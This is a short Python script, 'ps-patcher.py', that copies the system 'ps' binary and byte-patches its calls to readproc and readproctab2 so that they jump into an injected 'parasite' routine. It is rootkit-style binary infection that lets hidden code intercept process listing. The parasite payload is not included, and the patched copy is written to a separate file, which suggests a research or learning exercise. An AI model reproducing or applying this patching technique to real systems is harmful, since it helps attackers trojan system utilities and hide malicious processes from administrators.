# ----------------------------------------------------------------------------
# ps-patcher.py
#
# Written by Manuel Gebele (m.gebele‹ατ›tuta.io)
# This code is licensed under the MIT License (MIT). 
# ----------------------------------------------------------------------------
import os
import shutil
import subprocess

READPROC_PATCH = (
    b'\xe8\x22\xf4\xff\xff', # call readproc
    b'\xe8\x82\xdf\x3f\x00'  # call parasite_start_address
)

READPROCTAB2_PATCH = (
    b'\xe8\xc2\xf3\xff\xff', # call readproctab2
    b'\xe8\xb1\xe3\x3f\x00'  # call parasite_start_address +
                             # hijacked_readproctab2 offset
)

def ps_path():
    which_output = subprocess.check_output(['which', 'ps'])
    ps_path = which_output.decode('utf-8').strip()
    return ps_path

def ps_mod_path():
    file_abs_path = os.path.abspath(__file__)
    file_dir_path = os.path.dirname(file_abs_path)
    ps_mod_path = file_dir_path + "/ps-modified"
    return ps_mod_path

def make_ps_copy():
    pp = ps_path()
    pmp = ps_mod_path()
    print("[*] Copying " + pp + " to " + pmp)
    shutil.copy(pp, pmp)

def apply_patch(bin_bytes, patch):
    orig_bytes, patched_bytes = patch
    idx = bin_bytes.find(orig_bytes)
    if -1 == idx:
        print("[*] Couldn't find " + orig_bytes.hex() + " byte sequence")
        exit(1)
    print("[*] Applying patch " + patched_bytes.hex() + " at offset " + str(hex(idx)))
    bin_bytes = bin_bytes.replace(orig_bytes, patched_bytes)
    return bin_bytes

def apply_patches():
    make_ps_copy()

    pmp = ps_mod_path()
    ps_file = open(pmp, 'r+b')

    bin_bytes = ps_file.read()
    ps_file.seek(0)

    bin_bytes = apply_patch(bin_bytes, READPROC_PATCH)
    bin_bytes = apply_patch(bin_bytes, READPROCTAB2_PATCH)

    # Write modifications to disk.
    ps_file.write(bin_bytes)

    ps_file.close()

apply_patches()

print("[*] Done applying patches")
